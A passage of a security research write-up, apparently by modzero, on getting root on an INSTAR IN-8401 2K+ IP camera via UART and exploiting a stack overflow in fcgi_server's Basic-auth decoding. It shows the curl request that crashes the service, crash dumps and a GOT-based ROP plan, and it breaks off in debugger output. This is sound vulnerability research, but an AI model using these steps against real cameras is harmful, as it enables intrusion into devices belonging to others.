<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://modzero.com/en/blog/no-leak-no-problem/">Original</a>
    <h1>No Leak, No Problem – Bypassing ASLR with a ROP Chain to Gain RCE</h1>
    
    <div id="readability-page-1" class="page"><div><div id="page"><section><div id="post-header"><p><a href="https://modzero.com/en/blog/">⟵ Blog</a></p><p><span>research</span></p><p>November 10, 2025 — by Michael Imfeld</p></div><div><p>After my previous post on ARM exploitation, where we crafted an exploit for a known vulnerability, I decided to continue the research on a more modern IoT target. In this follow-up post, I will take you through building a considerably more complex binary exploit. We will explore the path from firmware extraction and analysis to the discovery of a previously unknown vulnerability and its exploitation. Follow along as we build an ARM ROP chain to bypass ASLR without an address leak, and achieve unauthenticated RCE.</p><h2 id="target-overview">Target Overview</h2><p>I examined the IN-8401 2K+, an IP camera from the German manufacturer INSTAR. It’s a modern networked surveillance camera that exposes a web-based user interface for configuration and live view. As I later found this particular model shares its firmware with other devices from INSTAR’s 2K+ and 4K series. According to Shodan<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> there are roughly 12,000 INSTAR devices visible on the public internet.</p><figure><img src="http://tinylogger.com/static/no-leak-no-problem/web_interface.png"/><figcaption><h4>INSTAR IN-8401 2K+ web interface</h4></figcaption></figure><h2 id="cracking-the-shell-open">Cracking the Shell Open</h2><p>Before we can meaningfully hunt for vulnerabilities, we need to gain access to the device to obtain its firmware. Access to the firmware exposes binaries, configuration files, scripts and the filesystem layout and enables both static inspection and dynamic testing. Without the firmware we’re stuck with blind fuzzing of the network interface.</p><p>It’s always a good idea to collect as much information as possible before diving into analysis mode. So I started with some reading. INSTAR provides quite an extensive documentation about its cameras and their features. I found a very interesting page titled “Restore your HD Camera after a faulty Firmware upgrade”<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The article explained that the camera exposes a UART interface and how it could be accessed to restore a firmware image. UART is a hardware interface used for serial communication commonly found on development boards, embedded systems, and debugging interfaces. In the documentation it looked like it’s possible to boot right into a root shell.</p><p>Although the article was written for the HD camera models, not my 2K+, I figured it might be worth a shot, since manufacturers often reuse features and components across different product versions. I removed the front part of the housing and spotted the debugging interface as shown on the wiki page.</p><p>I went ahead and attached some PCBites to the interface and connected them to a FTDI, which is a small USB-to-serial converter.</p><figure><img src="http://tinylogger.com/static/no-leak-no-problem/pcbite.jpg"/><figcaption><h4>Attaching FTDI to exposed UART interface</h4></figcaption></figure><p>I then plugged the FTDI into my Linux machine and connected to it. After supplying some input over the serial connection I was greeted with a login prompt, cool!</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span>INSTAR login: root
</span></span><span><span>Password:
</span></span><span><span>Login incorrect
</span></span></code></pre></td></tr></tbody></table></div></div><p>I tried a couple of the usual combinations like admin:admin, root:root, and so on, but had no success. The documentation explained that the boot process could be interrupted to obtain a root shell on the device’s OS. So I rebooted the camera to see if that worked.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span>U-Boot 2019.04 <span>(</span>Oct <span>18</span> <span>2023</span> - 11:38:25 +0000<span>)</span>
</span></span><span><span>
</span></span><span><span>CPU:   Novatek NT @ <span>999</span> MHz
</span></span><span><span>DRAM:  <span>512</span> MiB
</span></span><span><span>Relocation to 0x1ff3b000, Offset is 0x01f3b000 sp at 1fbf4dc0
</span></span><span><span>nvt_shminfo_init:  The fdt buffer addr: 0x1fbfb8c8
</span></span><span><span>ARM CA9 global timer had already been initiated
</span></span><span><span>otp_init!
</span></span><span><span>120MHz
</span></span><span><span><span>otp_timing_reg</span><span>=</span> 0xff6050
</span></span><span><span> <span>CONFIG_MEM_SIZE</span>                <span>=</span>      0x20000000
</span></span><span><span> <span>CONFIG_NVT_UIMAGE_SIZE</span>         <span>=</span>      0x01900000
</span></span><span><span> <span>CONFIG_NVT_ALL_IN_ONE_IMG_SIZE</span> <span>=</span>      0x14a00000
</span></span><span><span> <span>CONFIG_UBOOT_SDRAM_BASE</span>        <span>=</span>      0x1e000000
</span></span><span><span> <span>CONFIG_UBOOT_SDRAM_SIZE</span>        <span>=</span>      0x01fc0000
</span></span><span><span> <span>CONFIG_LINUX_SDRAM_BASE</span>        <span>=</span>      0x01100000
</span></span><span><span> <span>CONFIG_LINUX_SDRAM_SIZE</span>        <span>=</span>      0x1cf00000
</span></span><span><span> <span>CONFIG_LINUX_SDRAM_START</span>       <span>=</span>      0x1c700000
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span>phy interface: INTERNAL MII
</span></span><span><span>eth_na51055
</span></span><span><span>Hit any key to stop autoboot:  <span>0</span>
</span></span><span><span> do_nvt_boot_cmd: boot time: 1718855<span>(</span>us<span>)</span>
</span></span><span><span> <span>[</span>...<span>]</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>As you can see there was indeed a mechanism to stop the device from autobooting. But contrary to what the documentation suggested, interrupting the boot process didn’t provide a root shell on the OS, only in the U-Boot bootloader. U-Boot (short for Universal Bootloader) is an open-source bootloader commonly used in embedded systems to initialize hardware and load the operating system or firmware during startup.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span><span>9
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span>nvt@na51055: printenv
</span></span><span><span><span>arch</span><span>=</span>arm
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span><span>bootargs</span><span>=</span><span>console</span><span>=</span>ttyS0,115200 earlyprintk <span>nvt_pst</span><span>=</span>/dev/mmcblk2p0
</span></span><span><span><span>nvtemmcpart</span><span>=</span>0x40000@0x40000<span>(</span>fdt<span>)</span>ro,0x200000@0xc0000<span>(</span>uboot<span>)</span>ro,0x40000@0x2c0000<span>(</span>uenv<span>)</span>,0x400000@0x300000<span>(</span>linux<span>)</span>ro,0x40000000@0xb00000<span>(</span>rootfs0<span>)</span>,0xc000000@0x40b00000<span>(</span>rootfs1<span>)</span>,0x40000000@0x4cb00000<span>(</span>rootfs2<span>)</span>,0x1000000@0x8CF00000<span>(</span>rootfsl1<span>)</span>,0x10000000@0x8E300000<span>(</span>rootfsl2<span>)</span>,0xe6a340@0<span>(</span>total<span>)</span> <span>root</span><span>=</span>/dev/mmcblk2p1 <span>rootfstype</span><span>=</span>ext4 rootwait rw
</span></span><span><span><span>bootcmd</span><span>=</span>nvt_boot
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span><span>vendor</span><span>=</span>novatek
</span></span><span><span><span>ver</span><span>=</span>U-Boot 2019.04 <span>(</span>Oct <span>18</span> <span>2023</span> - 11:38:25 +0000<span>)</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>I noticed that the Kernel boot parameters were provided by an environment variable called <code>bootargs</code>. I went ahead an tried the <code>init=/bin/sh</code> trick which tells the Kernel to start a shell instead of the init process. I updated the variable accordingly and tried to boot using <code>nvt_boot</code>.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span>invt@na51055: setenv bootargs <span>&#34;console=ttyS0,115200 earlyprintk nvt_pst=/dev/mmcblk2p0
</span></span></span><span><span><span>nvtemmcpart=0x40000@0x40000(fdt)ro,0x200000@0xc0000(uboot)ro,0x40000@0x2c0000(uenv),0x400000@0x300000(linux)ro,0x40000000@0xb00000(rootfs0),0xc000000@0x40b00000(rootfs1),0x40000000@0x4cb00000(rootfs2),0x1000000@0x8CF00000(rootfsl1),0x10000000@0x8E300000(rootfsl2),0xe6a340@0(total) root=/dev/mmcblk2p1 rootfstype=ext4 rootwait rw init=/bin/sh&#34;</span>
</span></span><span><span>nvt@na51055: nvt_boot
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span>EXT4-fs <span>(</span>mmcblk2p1<span>)</span>: recovery <span>complete</span>
</span></span><span><span>EXT4-fs <span>(</span>mmcblk2p1<span>)</span>: mounted filesystem with ordered data mode. Opts: <span>(</span>null<span>)</span>
</span></span><span><span>VFS: Mounted root <span>(</span>ext4 filesystem<span>)</span> on device 179:1.
</span></span><span><span>devtmpfs: mounted
</span></span><span><span>Freeing unused kernel memory: 1024K
</span></span><span><span>Run /bin/sh as init process
</span></span><span><span>/bin/sh: can<span>&#39;</span>t access tty<span>;</span> job control turned off
</span></span><span><span>/ <span># id</span>
</span></span><span><span><span>uid</span><span>=</span>0<span>(</span>root<span>)</span> <span>gid</span><span>=</span>0<span>(</span>root<span>)</span>
</span></span><span><span>/ <span># hostname</span>
</span></span><span><span>INSTAR
</span></span></code></pre></td></tr></tbody></table></div></div><p>It worked. I added a new root user and rebooted the device. Now I was able to login to the device using the newly created user. I dumped the whole filesystem for analysis and as a backup so I could also restore it later, if anything went wrong along the way.</p><h2 id="high-level-architecture--attack-surface">High-Level Architecture &amp; Attack Surface</h2><p>With the device unlocked and open for exploration it’s very easy to get swept away by curiosity. With the goal of finding exploitable vulnerabilities in mind it’s important to lay out something like an attack surface map first.</p><p>The web stack consisted of various components, most prominently a lighttpd web server that acted as an entry point and reverse proxy. I started by inspecting its configuration to see what it was doing. As you would expect from a reverse proxy, incoming requests were forwarded to the appropriate backend. For example, requests to files ending with <code>.cgi</code> were routed to the fcgi_server binary through a socket at <code>/tmp/instt_fcgi.socket</code>.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span>fastcgi.server <span>=</span> <span>(</span> <span>&#34;.cgi&#34;</span> <span>=</span>&gt; <span>((</span>
</span></span><span><span><span>&#34;bin-path&#34;</span> <span>=</span>&gt; <span>&#34;/home/ipc/bin/fcgi_server&#34;</span>,
</span></span><span><span><span>&#34;socket&#34;</span> <span>=</span>&gt; <span>&#34;/tmp/instt_fcgi.socket&#34;</span>,
</span></span><span><span><span>&#34;max-procs&#34;</span> <span>=</span>&gt; 1,
</span></span><span><span><span>&#34;check-local&#34;</span> <span>=</span>&gt; <span>&#34;disable&#34;</span>
</span></span><span><span><span>))</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>I was mainly interested in finding code that was reachable without authentication. From my initial exploration I knew that there was an SQLite database file where the web interface users were stored, so the binary that performed authentication had to access this file. However, I couldn’t confirm that <code>fcgi_server</code> was interacting with it. I concluded another component must be involved. In the process list I noticed a process called <code>ipc_server</code>. I attached <code>strace</code> to see what it was doing and found that incoming requests for most endpoints were forwarded from <code>fcgi_server</code> to <code>ipc_server</code> via <code>/tmp/insttv2_socket</code>.</p><p>As an example:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span>$ curl <span>&#39;192.168.0.3/param.cgi?cmd=mod0&amp;paramkey=paramvalue&#39;</span>
</span></span><span><span><span>cmd</span><span>=</span><span>&#34;mod0&#34;</span><span>;</span>
</span></span><span><span><span>response</span><span>=</span><span>&#34;204&#34;</span><span>;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>On ipc_server’s end:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span>recv<span>(</span>91, <span>&#34;\4cmd\0\3\5\0\0\0mod0\0\6param\0\4\32\0\0\0\tparamkey\0\3\v\0\0\0paramvalue\0\7header\0\4\25\0\0\0\3ip\0\3\f\0\0\000192.168.0.1\0&#34;</span>, 87, 0<span>)</span> <span>=</span> <span>87</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>As you can observe, the HTTP request wasn’t forwarded as-is, it was first serialized using some type of Type–Length–Value (TLV) structure. These observations also made it clear that authentication and the core application logic reside in the <code>ipc_server</code> backend.</p><p>With this, I had identified two interesting targets: <code>fcgi_server</code> and <code>ipc_server</code>, both of which were reachable by an unauthenticated attacker.</p><h2 id="methodology">Methodology</h2><p>With the two main targets <code>fcgi_server</code> and <code>ipc_server</code> identified we can now focus on searching for vulnerabilities. In this section I want to quickly touch on the methods I employed for doing so.</p><p>Probably one of the most important ingredients for efficient vulnerability hunting is having a proper debugging setup in place. This allows for quickly double-checking any assumptions made during static analysis, tracing calls, and so on. I ran more or less an identical setup to the one used in the last research with a gdb server on the IP camera and a gdb client on the attacker’s machine.</p><p>For this research I primarily used two approaches: fuzzing, and a combination of static and dynamic analysis. I started off with something that I would call a very primitive way of black-box fuzzing using boofuzz<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> on collected web endpoints. I tried fuzzing through all possible parameters I had found on various endpoints to see if I could trigger a crash. Although this approach yielded CVE-2025-8761<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>, I felt like it was very inefficient as a crash of the whole system was the only thing I was able to reliably detect (more on that later).</p><p>As a secondary approach I spent quite some time on reverse engineering the two binaries <code>fcgi_server</code> and <code>ipc_server</code>. I tried to get an understanding of how things work while focusing on the usual suspects for memory corruption like bounds checking, pointer arithmetic, etc. To speed things up my process usually involved examining the decompiled binary, making assumptions, and verifying them using <code>gdb</code> and <code>strace</code> dynamically.</p><h2 id="vulnerability-hunting">Vulnerability Hunting</h2><p>Let’s have a look at some code. As described earlier <code>fcgi_server</code> acted as some sort of custom middleware that translated web requests into ipc messages. In the decompiled binary I found a dispatcher for <code>.cgi</code> endpoints which called certain handler functions based on the given URI.</p><figure><img src="http://tinylogger.com/static/no-leak-no-problem/fcgi_server_dispatcher.png"/><figcaption><h4>Dispatcher function in decompiled fcgi_server binary</h4></figcaption></figure><p>In most of the handler functions a similar pattern emerged. Inside each handler there was a call to the same function which looked like another dispatcher. I identified the second dispatcher as some sort of authentication handler.</p><figure><img src="http://tinylogger.com/static/no-leak-no-problem/fcgi_server_handle_update.png"/><figcaption><h4>Update handling function in decompiled fcgi_server binary</h4></figcaption></figure><p>I assumed that the code had to extract and serialize the corresponding auth data from http requests differently, depending on the authentication mechanism used. There were several different handlers one of which I identified as the basic auth handler.</p><figure><img src="http://tinylogger.com/static/no-leak-no-problem/fcgi_server_auth_handler.png"/><figcaption><h4>Auth handler function in decompiled fcgi_server binary</h4></figcaption></figure><p>Inside the basic auth handler, there was a call to another function that looked like a custom implementation of Base64 decoding. As you might have noticed, the decompiled code contained typical C++ elements such as class methods, this pointers, and references to the C++ standard library. Most of the string-related functionality I had seen so far was therefore using C++’s standard string handling. In this case, however, I noticed a <code>memcpy</code> that copied the decoded Base64 result into a fixed-size buffer (516 bytes) located on the stack.</p><figure><img src="http://tinylogger.com/static/no-leak-no-problem/fcgi_server_base64_decode.png"/><figcaption><h4>Base64 decoding function in decompiled fcgi_server binary</h4></figcaption></figure><p>Without spending much more time on static analysis, I moved on to perform some dynamic testing of the basic authentication functionality. First, I needed to verify my assumption that the basic auth handler and Base64 decode function were being triggered, so I set a few breakpoints and sent a request.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span><span>9
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>$ curl -k https://192.168.0.3/castore.cgi -u <span>&#39;A:B&#39;</span> -v
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span>* Request completely sent off
</span></span><span><span>* TLSv1.3 <span>(</span>IN<span>)</span>, TLS handshake, Newsession Ticket <span>(</span>4<span>)</span>:
</span></span><span><span>* TLSv1.3 <span>(</span>IN<span>)</span>, TLS handshake, Newsession Ticket <span>(</span>4<span>)</span>:
</span></span><span><span>&lt; HTTP/2 <span>500</span>
</span></span><span><span>&lt; content-type: text/plain<span>;</span> <span>charset</span><span>=</span>utf-8
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span>&lt; server: lighttpd/1.4.72
</span></span></code></pre></td></tr></tbody></table></div></div><p>The breakpoints triggered which confirmed my assumptions so far and I got back a 500.</p><p>Then I sent another request with a very long basic auth string exceeding the 516 buffer length in the base64 decode function.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>$ curl -k https://192.168.0.3/castore.cgi -u <span>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:B&#39;</span> -v
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span>* Request completely sent off
</span></span><span><span>* TLSv1.3 <span>(</span>IN<span>)</span>, TLS handshake, Newsession Ticket <span>(</span>4<span>)</span>:
</span></span><span><span>* TLSv1.3 <span>(</span>IN<span>)</span>, TLS handshake, Newsession Ticket <span>(</span>4<span>)</span>:
</span></span><span><span>&lt; HTTP/2 <span>500</span>
</span></span><span><span>&lt; content-type: text/html
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span>&lt; server: lighttpd/1.4.72
</span></span><span><span>&lt;
</span></span><span><span>&lt;?xml <span>version</span><span>=</span><span>&#34;1.0&#34;</span> <span>encoding</span><span>=</span><span>&#34;iso-8859-1&#34;</span>?&gt;
</span></span><span><span>&lt;!DOCTYPE html PUBLIC <span>&#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;</span>
</span></span><span><span>         <span>&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;</span>&gt;
</span></span><span><span>&lt;html <span>xmlns</span><span>=</span><span>&#34;http://www.w3.org/1999/xhtml&#34;</span> xml:lang<span>=</span><span>&#34;en&#34;</span> <span>lang</span><span>=</span><span>&#34;en&#34;</span>&gt;
</span></span><span><span> &lt;head&gt;
</span></span><span><span>  &lt;title&gt;500 Internal Server Error&lt;/title&gt;
</span></span><span><span> &lt;/head&gt;
</span></span><span><span> &lt;body&gt;
</span></span><span><span>  &lt;h1&gt;500 Internal Server Error&lt;/h1&gt;
</span></span><span><span> &lt;/body&gt;
</span></span><span><span>&lt;/html&gt;
</span></span></code></pre></td></tr></tbody></table></div></div><p>I got back another 500. However, the response wasn’t the same, this time it included an HTML error message. Strange, right? Let’s have a look at what the serial terminal showed.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span>Hardware name: Novatek Video Platform
</span></span><span><span>PC is at 0x41414140
</span></span><span><span>LR is at 0x76e39e8c
</span></span><span><span>pc : <span>[</span>&lt;41414140&gt;<span>]</span>    lr : <span>[</span>&lt;76e39e8c&gt;<span>]</span>    psr: <span>60010030</span>
</span></span><span><span>sp : 753808d0  ip : 76e6f48c  fp : <span>41414141</span>
</span></span><span><span>r10: <span>41414141</span>  r9 : <span>41414141</span>  r8 : <span>41414141</span>
</span></span><span><span>r7 : <span>41414141</span>  r6 : <span>41414141</span>  r5 : <span>41414141</span>  r4 : <span>41414141</span>
</span></span><span><span>r3 : <span>00000000</span>  r2 : <span>75380698</span>  r1 : <span>00000000</span>  r0 : <span>75380698</span>
</span></span><span><span>Flags: nZCv  IRQs on  FIQs on  Mode USER_32  ISA Thumb  Segment user
</span></span><span><span>Control: 10c5387d  Table: 4dbdc04a  DAC: <span>00000055</span>
</span></span><span><span>CPU: <span>1</span> PID: <span>6392</span> Comm: fcgi_server Tainted: P           O      4.19.91 <span>#1</span>
</span></span><span><span>Hardware name: Novatek Video Platform
</span></span><span><span>Backtrace:
</span></span><span><span><span>[</span>&lt;8010b428&gt;<span>]</span> <span>(</span>dump_backtrace<span>)</span> from <span>[</span>&lt;8010b554&gt;<span>]</span> <span>(</span>show_stack+0x18/0x1c<span>)</span>
</span></span><span><span> r7:41414140 r6:60070013 r5:00000000 r4:808405e4
</span></span><span><span><span>[</span>...<span>]</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>What happened? The program had crashed. <code>PC is at 0x41414140</code> indicates that I had overwritten the stack since the code took the return address from the stack and tried jumping to it. In this case <code>0x41414140</code> which corresponds to the payload sent. I had found a stack-based buffer overflow.</p><p>Why hadn’t I discovered this vulnerability during my initial fuzzing? I figured there were two reasons:</p><ul><li>The HTTP status code was the same as for a normal request, only the response body differed. So getting a 500 response to the request was nothing unusual.</li><li>The lighttpd server immediately restarted <code>fcgi_server</code>, so the crash wasn’t noticeable from an outside perspective.</li></ul><p>This once again highlights the importance of a proper debugging setup.</p><h2 id="exploitation">Exploitation</h2><p>Before we jump to the fun part, a quick heads up: If you’re not familiar with binary exploitation or the ARM architecture I’d recommend to have a look at the previous blog post<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> first as many concepts are similar to those from the previous research and won’t be described in detail in this post.</p><p>Let’s first discuss the preconditions of exploiting the discovered stack-based buffer overflow. We’re dealing with an ARMHF 32 bit binary, dynamically linked and stripped. As shown by <code>checksec</code> the target binary isn’t protected by stack canaries, but does have the NX mitigation enabled. It isn’t compiled as a position independent executable (PIE) and has partial relocation read-only (RELRO).</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>$ file fcgi_server
</span></span><span><span>fcgi_server: ELF 32-bit LSB executable, ARM, EABI5 version <span>1</span> <span>(</span>SYSV<span>)</span>, dynamically linked, interpreter /lib/ld-linux-armhf.so.3, <span>for</span> GNU/Linux 4.9.0, stripped
</span></span></code></pre></td></tr></tbody></table></div></div><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>$ checksec --file<span>=</span>fcgi_server
</span></span><span><span>RELRO           STACK CANARY      NX            PIE
</span></span><span><span>Partial RELRO   No canary found   NX enabled    No PIE
</span></span></code></pre></td></tr></tbody></table></div></div><p>What does this mean for us as attackers? Overwriting return addresses on the stack with an overflow is straightforward because of the lack of stack canaries. However, we can’t execute shellcode on the stack. Also, the binary will always be placed in the same memory region, because it wasn’t compiled as a PIE. Finally, partial RELRO means that the global offset table (GOT) comes before the BSS section in memory, which holds uninitialized global and static variables. This eliminates the risk of a buffer overflow from a global variable overwriting GOT entries<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup>. Since our overflow is on the stack, this doesn’t really matter to us. What does matter though, is that it also means that the GOT is writable. Only full RELRO provides a read-only GOT.</p><p>Let’s also have a look at the libraries included by the target binary such as the libc. We can see that libc was compiled with PIE, meaning that it can be placed randomly in memory during runtime.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>$ checksec --file<span>=</span>libc-2.29.so
</span></span><span><span>RELRO           STACK CANARY      NX            PIE
</span></span><span><span>Partial RELRO   Canary found      NX enabled    DSO
</span></span></code></pre></td></tr></tbody></table></div></div><p>Evidently, when looking at the mitigations in place, it makes sense to consider a Return-oriented programming (ROP) chain to achieve command execution. A ROP chain leverages small code snippets, or gadgets, already present in a program’s memory. By linking these gadgets, an attacker constructs an unintended, attacker-controlled execution flow. The effectiveness of a ROP chain depends on the availability of suitable gadgets and the attacker’s knowledge of their memory addresses.</p><p>In our case we could use gadgets from the target binary (<code>fcgi_server</code>) itself because their addresses are static and therefore known. These gadgets are quite limited though and eventually we would need to call file I/O functions or <code>system()</code> provided by libc to gain command execution. Note that libc was compiled with PIE. I quickly confirmed on the device that address space layout randomization (ASLR) was enabled, so libc was indeed placed at a random address in memory.</p><p>I came up with a couple of ideas on how to deal with this:</p><ul><li>Find a libc address leak through another vulnerability</li><li>Find a file read for /proc/self/maps</li><li>Leak a libc address through a ROP chain</li></ul><p>Unfortunately, I couldn’t quickly find another vulnerability that would let me leak a libc address. I considered reading <code>/proc/self/maps</code> to locate libc, but that proved unsuccessful. I also looked into using gadgets in the target binary to build a ROP chain to leak a libc address. However, there was no straightforward way to exfiltrate the leaked pointer.</p><p>A bigger issue was that any ROP chain would eventually crash the binary, rendering the leak useless because libc would be relocated on the next start of <code>fcgi_server</code>. In a stack-based buffer overflow, it’s also impossible to restore the stack to its previous state, as the very information required for restoration is overwritten.</p><p>One approach often used in this kind of scenario is to trigger the bug multiple times to prolong the crash: trigger it once to leak an address, then return to the vulnerable function and trigger the overflow again to make use of the leak. However, that approach requires an I/O channel to read the leak and then supply input again. Given the web-stack architecture we discussed and the bug’s location, that wasn’t feasible, so I concluded a one-shot exploit was likely the only viable option.</p><h3 id="the-plan">The Plan</h3><p>There are several known techniques that revolve around the GOT and Procedure Linkage Table (PLT) to bypass ASLR. When a call to an external function such as <code>puts</code> (libc) is made, the immediate call goes to <code>puts@plt</code> which acts as a resolver of the actual address of <code>puts</code> within libc. The resolved address is then stored in the GOT. If a specific function has already been resolved previously it is taken from the GOT by the <code>puts@plt</code> stub<sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup>.</p><p>So the information needed to bypass ASLR lives in the GOT. Ideally we’d find the address of <code>system</code> there, but the target binary never references <code>system</code>, so it has no GOT/PLT entry. Instead, we could read a GOT entry for another function, compute the offset from that function to our target, and use that to redirect execution to the target. But all of this must be done via a ROP chain built from gadgets available in the binary.</p><p>The high level steps would look something like this:</p><ul><li>Read a GOT entry and store in register x</li><li>Increment/decrement register x to reach target function (eg. addition, multiply, etc.)</li><li>Jump to x</li></ul><p>Or another approach:</p><ul><li>Increment/decrement value pointed to by GOT pointer to reach target function (GOT is writable)</li><li>Dereference GOT pointer into register x</li><li>Jump to x</li></ul><p>Still a vast simplification, we would still need to move arguments into the correct registers and so on before jumping to the target function <code>system()</code> but it’s a starting point.</p><h3 id="finding-the-pieces">Finding the Pieces</h3><p>To pursue this idea I first wanted to find a GOT entry that is already populated when triggering the vulnerability. Within the vulnerable base64 decode function there is a call to <code>isalnum</code> which is a libc function. Let’s have a look at its PLT and GOT entries.</p><p>Using <code>objdump</code> we can see the address of the PLT entry inside <code>fcgi_server</code> of <code>isalnum</code></p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>objdump -d fcgi_server<span>|</span> grep <span>&#39;&lt;isalnum@plt&gt;&#39;</span>
</span></span><span><span>000147e8 &lt;isalnum@plt&gt;:
</span></span><span><span>   206c8:       ebffd046        bl      147e8 &lt;isalnum@plt&gt;
</span></span><span><span>   21010:       ebffcdf4        bl      147e8 &lt;isalnum@plt&gt;
</span></span></code></pre></td></tr></tbody></table></div></div><p>To verify the corresponding GOT entry and actual address at runtime I set a breakpoint at the return statement after the overflow.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span><span>(</span>remote<span>)</span> gef➤  info address isalnum@got.plt
</span></span><span><span>Symbol <span>&#34;isalnum@got.plt&#34;</span> is at 0x400c8 in a file compiled without debugging.
